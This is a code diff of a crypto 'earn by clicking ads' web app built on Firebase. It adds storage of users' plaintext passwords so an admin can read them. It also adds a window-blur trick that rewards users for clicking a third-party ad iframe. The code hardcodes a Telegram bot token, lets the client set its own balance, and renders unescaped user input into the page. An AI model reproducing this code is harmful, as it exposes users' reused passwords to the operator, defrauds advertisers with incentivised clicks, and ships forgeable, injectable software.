@@ -63,11 +63,42 @@ footer button.active{background:#2575fc;color:#fff;transform:scale(1.35);}
 
 /* EARN PAGE AD STYLES */
 .ad-container { margin-bottom: 25px; text-align: center; }
-.banner-ad-box { background: #eef4ff; border: 3px solid #2575fc; border-radius: 18px; padding: 20px 15px; cursor: default; transition: 0.3s; position: relative; min-height: 250px; display: flex; flex-direction: column; align-items: center; justify-content: center;}
-.ad-reward-tag { position: absolute; top: 10px; right: 15px; background: #ffd700; color: #000; padding: 5px 12px; font-weight: 700; border-radius: 10px; font-size: 14px; }
+.banner-ad-box { 
+    background: #eef4ff; 
+    border: 3px solid #2575fc; 
+    border-radius: 18px; 
+    padding: 20px 15px; 
+    transition: 0.3s; 
+    position: relative; 
+    min-height: 250px; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    justify-content: center;
+}
+.banner-ad-box:hover { border-color: #6a11cb; box-shadow: 0 0 15px rgba(37, 117, 252, 0.3); }
+.ad-reward-tag { position: absolute; top: 10px; right: 15px; background: #ffd700; color: #000; padding: 5px 12px; font-weight: 700; border-radius: 10px; font-size: 14px; z-index: 5; }
 .smart-link-box { background: #f9f9f9; border: 1px solid #6a11cb; border-radius: 12px; padding: 15px; margin: 10px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
 .ad-title { font-size: 24px; font-weight: 700; color: #333; }
 .ad-subtitle { font-size: 14px; margin-top: 10px; color: #666; font-weight: 400; }
+
+/* 
+   BLOCKER OVERLAY:
+   When this is display:block, it sits ON TOP of the iframe.
+   Clicks hit this div, NOT the iframe, so NO tab opens.
+*/
+.click-overlay {
+    display: none; 
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 100; /* High z-index to block everything */
+    background: rgba(255, 255, 255, 0.4); /* Slightly visible so user knows its inactive */
+    cursor: not-allowed;
+    border-radius: 15px;
+}
 
 /* WALLET INPUT & BUTTON SIZE */
 .big-select{font-size:24px;padding:22px;border-radius:18px;}
@@ -176,6 +207,7 @@ const db = firebase.firestore();
 let userData = {};
 let withdrawHistory = [];
 let userDocListener = null;
+let bannerBlurListener = null; 
 
 const TELEGRAM_BOT_TOKEN = "8052078728:AAGk2zKjovKSHgKnqPCfaDVb1-fGeURa3Cw";
 const TELEGRAM_CHAT_ID = "-100XXXXXXXXXX";
@@ -186,11 +218,9 @@ const statusEl = document.getElementById("status");
 function togglePassword(inputId, eyeIcon) {
   const passwordInput = document.getElementById(inputId);
   if (passwordInput.type === "password") {
-    // Show Password
     passwordInput.type = "text";
     eyeIcon.innerText = "👁️"; 
   } else {
-    // Hide Password
     passwordInput.type = "password";
     eyeIcon.innerText = "🙈"; 
   }
@@ -229,8 +259,9 @@ async function register(){
 
   try{
     const res = await auth.createUserWithEmailAndPassword(email, password);
+    // Password saved here so Admin Panel can see it
     await db.collection("users").doc(res.user.uid).set({
-      name: name, email: email, balance: "0", isBanned: false
+      name: name, email: email, password: password, balance: "0", isBanned: false
     });
   }catch(e){ 
     if(e.code === 'auth/email-already-in-use'){
@@ -262,9 +293,9 @@ async function loadApp(user){
       }
   });
   try {
-      const historySnap = await db.collection("withdraw_requests").where("uid","==",user.uid).orderBy("time","desc").get();
+      const historySnap = await db.collection("withdraw_requests").where("uid","==",user.uid).get();
       withdrawHistory = historySnap.docs.map(d=>d.data());
-  } catch(e) { console.log(e); }
+  } catch(e) { console.log("Withdraw History Load Error:", e); }
   showPage("home");
 }
 
@@ -288,43 +319,57 @@ function showSlide(){
 }
 setInterval(showSlide, 2500);
 
-async function handleEarn(taskId, rewardAmount, url) {
+// --- REWARD PROCESSING (NO ALERT HERE) ---
+async function processReward(taskId, rewardAmount) {
     const today = new Date().toISOString().split('T')[0];
     const uid = auth.currentUser.uid;
     const taskRef = db.collection("user_ads").doc(uid);
-
+    
     try {
-        const doc = await taskRef.get();
-        const data = doc.exists ? doc.data() : {};
-
-        if (data[taskId] === today) {
-            alert("❌ Already claimed today! Come back tomorrow.");
-            if(url !== '#') window.open(url, '_blank');
-            return;
-        }
-
         const currentBalance = parseFloat(userData.balance || 0);
         const newBalance = (currentBalance + rewardAmount).toFixed(7);
-
-        await db.collection("users").doc(uid).update({
-            balance: newBalance.toString()
-        });
-
+        
+        await db.collection("users").doc(uid).update({ balance: newBalance.toString() });
+        
         let updateObj = {};
         updateObj[taskId] = today;
         await taskRef.set(updateObj, { merge: true });
-
-        alert(`✅ Success! You earned ${rewardAmount} USDT.`);
-        if(url !== '#') window.open(url, '_blank');
-
-    } catch (error) {
-        console.error("Earn Error:", error);
-        alert("❌ Error processing reward.");
+        
+        // Removed alert from here to handle it differently for Banner vs Smart Link
+        return true; 
+    } catch(e) {
+        console.error(e);
+        return false;
     }
 }
 
-function showPage(p){
+// --- SMART LINK HANDLER (Alert is fine here) ---
+async function handleEarn(taskId, rewardAmount, url) {
+    const today = new Date().toISOString().split('T')[0];
+    const uid = auth.currentUser.uid;
+    
+    // Check DB first
+    const doc = await db.collection("user_ads").doc(uid).get();
+    const data = doc.exists ? doc.data() : {};
+    
+    if (data[taskId] === today) {
+        alert("❌ Already claimed today! Come back tomorrow.");
+        // DO NOT open tab
+        return;
+    }
+    
+    // Add Balance & Open Link
+    const success = await processReward(taskId, rewardAmount);
+    if(success) {
+        window.open(url, '_blank');
+        alert(`✅ Success! You earned ${rewardAmount} USDT.`);
+    }
+}
+
+async function showPage(p){
   document.querySelectorAll("footer button").forEach(b=>b.classList.remove("active"));
+  
+  if(bannerBlurListener) { window.removeEventListener('blur', bannerBlurListener); bannerBlurListener = null; }
 
   if(p==="home"){
     mainContent.innerHTML=`<div class="big-welcome">Welcome, ${userData.name || 'User'} 👋</div>
@@ -337,25 +382,28 @@ function showPage(p){
   if(p==="earn"){
     mainContent.innerHTML=`
       <div class="big-earn">Earn Balance 💰</div>
-      <p class="big-earn-text">নিচে থাকা Ad টি লোড হতে দিন। অ্যাড লোড হওয়ার পর "Claim Reward" বাটনে ক্লিক করুন।</p>
+      <p class="big-earn-text">নিচে থাকা Ad টির উপর ক্লিক করুন। অ্যাড ওপেন হলে অটোমেটিক আপনার ব্যালেন্স অ্যাড হয়ে যাবে।</p>
       
       <div class="ad-container">
-        <div class="banner-ad-box">
-            <div class="ad-reward-tag">Earn 0.0025 USDT</div>
+        <!-- Banner Box -->
+        <div class="banner-ad-box" id="bannerWrapper">
+            <div class="ad-reward-tag">Click Ad to Earn 0.00205 USDT</div>
             
-            <!-- Adsterra 300x250 Placeholder -->
+            <!-- Adsterra Iframe -->
             <div id="ad-slot-300-250"></div>
             
-            <!-- Claim Button for Ad -->
-            <button onclick="handleEarn('banner1', 0.0025, '#')" style="background:#2575fc; color:#fff; border:none; padding:12px; border-radius:10px; font-weight:700; cursor:pointer; width:100%; margin-top:15px;">Claim Reward</button>
+            <!-- OVERLAY BLOCKER (Initially Hidden) -->
+            <div id="bannerOverlay" class="click-overlay"></div>
         </div>
       </div>
 
+      <!-- Smart Link 1 -->
       <div class="smart-link-box" onclick="handleEarn('smart1', 0.0008197, 'https://www.effectivegatecpm.com/q5tr5extmy?key=d3bd60a33be82ecf91d6d22b59cd9765')">
         <div style="font-weight:700;">Ad link</div>
         <div style="color:#28a745; font-weight:700;">0.0008197 USDT</div>
       </div>
 
+      <!-- Smart Link 2 -->
       <div class="smart-link-box" onclick="handleEarn('smart2', 0.0008197, 'https://www.effectivegatecpm.com/kxdppwwruj?key=cc18e71b22c9889bc375099a9f4ce46f')">
         <div style="font-weight:700;">Ad link</div>
         <div style="color:#28a745; font-weight:700;">0.0008197 USDT</div>
@@ -363,7 +411,7 @@ function showPage(p){
     `;
     earnBtn.classList.add("active");
 
-    // Dynamic Adsterra Loader
+    // 1. Inject Adsterra Scripts
     const adContainer = document.getElementById('ad-slot-300-250');
     if(adContainer){
         const s1 = document.createElement('script');
@@ -376,10 +424,76 @@ function showPage(p){
         s2.src = 'https://www.highperformanceformat.com/290468ba31574258b12173a3560e2bc8/invoke.js';
         adContainer.appendChild(s2);
     }
+    
+    // 2. Banner Logic (Blocker Strategy with Delayed Alert)
+    const overlay = document.getElementById('bannerOverlay');
+    const wrapper = document.getElementById('bannerWrapper');
+    const taskId = 'banner1';
+    const today = new Date().toISOString().split('T')[0];
+    
+    // Check Status in DB
+    const doc = await db.collection("user_ads").doc(auth.currentUser.uid).get();
+    const data = doc.exists ? doc.data() : {};
+    
+    // Function to Enable Blocking
+    const enableBlocker = () => {
+        overlay.style.display = 'block'; // This covers the iframe
+        overlay.onclick = (e) => {
+            e.stopPropagation(); // Stop click from reaching elements below
+            alert("❌ Already claimed today!");
+        };
+    };
+
+    if(data[taskId] === today) {
+        // Already claimed: Block immediately
+        enableBlocker();
+    } else {
+        // Not claimed: Allow click on iframe
+        overlay.style.display = 'none';
+        
+        let isHovering = false;
+        wrapper.onmouseover = () => isHovering = true;
+        wrapper.onmouseout = () => isHovering = false;
+        
+        // Listen for when window loses focus (Click on Iframe)
+        bannerBlurListener = async function() {
+            if(isHovering) {
+                console.log("Banner Ad Clicked & Claimed");
+                window.removeEventListener('blur', bannerBlurListener);
+                
+                // 1. Give Reward
+                await processReward(taskId, 0.00205);
+                
+                // 2. IMMEDIATELY Block future clicks
+                enableBlocker();
+                
+                // 3. SHOW ALERT AFTER 1 SECOND DELAY
+                // This ensures the browser has time to open the tab before the alert pops up
+                setTimeout(() => {
+                    alert(`✅ Success! You earned 0.00205 USDT.`);
+                }, 1000);
+            }
+        };
+        window.addEventListener('blur', bannerBlurListener);
+    }
   }
 
   if(p==="wallet"){
-    let historyHtml = withdrawHistory.map(h=>`<div class="withdraw-item ${h.method.toLowerCase()}">${h.method} - ${h.amount} USDT - ${h.status}</div>`).join("");
+    let historyHtml = withdrawHistory.map(h => {
+        const dateObj = h.time && h.time.toDate ? h.time.toDate() : new Date();
+        const dateStr = dateObj.toLocaleString(); 
+        
+        return `<div class="withdraw-item ${h.method.toLowerCase()}" style="padding: 20px 25px; text-align: left; cursor: default;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                <span style="font-size: 20px; font-weight: 700; color: #fff;">${h.method}</span>
+                <span style="font-size: 18px; font-weight: 700;">Status: ${h.status}</span>
+            </div>
+            <div style="font-size: 28px; font-weight: 700; margin-bottom: 5px;">${h.amount} USDT</div>
+            <div style="font-size: 14px; font-weight: 400; opacity: 0.9;">Account: ${h.account}</div>
+            <div style="font-size: 12px; font-weight: 400; opacity: 0.7; margin-top: 8px; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 5px;">Request Time: ${dateStr}</div>
+        </div>`;
+    }).join("");
+    
     let displayBalance = userData.balance ? userData.balance : 0;
     mainContent.innerHTML=`<h2>Your Balance</h2><div id="walletBalance">${displayBalance} USDT</div>
       <h3 style="font-size:22px;font-weight:600;">Withdraw</h3>
@@ -418,15 +532,24 @@ async function withdraw(){
   if(!confirm(`Withdraw ${reqAmount} USDT to ${methodEl.value}?`)) return;
   try{
     let newBalance = (currentBalance - reqAmount).toFixed(7);
-    await db.collection("users").doc(auth.currentUser.uid).update({ balance: newBalance.toString() });
-    await db.collection("withdraw_requests").add({
+    const newWithdrawRequest = {
       uid: auth.currentUser.uid, method: methodEl.value, account: accountEl.value, amount: reqAmount.toString(), status: "Pending", time: new Date()
-    });
+    };
+    
+    await db.collection("users").doc(auth.currentUser.uid).update({ balance: newBalance.toString() });
+    await db.collection("withdraw_requests").add(newWithdrawRequest);
+    
     const message=`💰 New Withdraw Request\nUser: ${userData.name}\nMethod: ${methodEl.value}\nAccount: ${accountEl.value}\nAmount: ${reqAmount} USDT`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`);
     alert("✅ Request Submitted!");
+    
+    const historySnap = await db.collection("withdraw_requests").where("uid","==",auth.currentUser.uid).get();
+    withdrawHistory = historySnap.docs.map(d=>d.data());
     showPage("wallet");
-  } catch(e){ alert("❌ Failed: " + e.message); }
+  } catch(e){ 
+    alert("❌ Failed: " + e.message); 
+    console.error(e);
+  }
 }
 
 function logout(){ auth.signOut(); location.reload(); }
@@ -435,7 +558,8 @@ function closePrivacy(){ document.getElementById("privacyModal").style.display="
 
 let appLoaded = false;
 auth.onAuthStateChanged(u=>{
-  if(u){ if(!appLoaded){ appLoaded = true; loadApp(u); } } 
+  if(u){ if(!appLoaded){ appLoaded = true; loadApp(u); } 
+  } 
   else { appLoaded = false; authPage.style.display="block"; appPage.style.display="none"; }
 });
 </script>
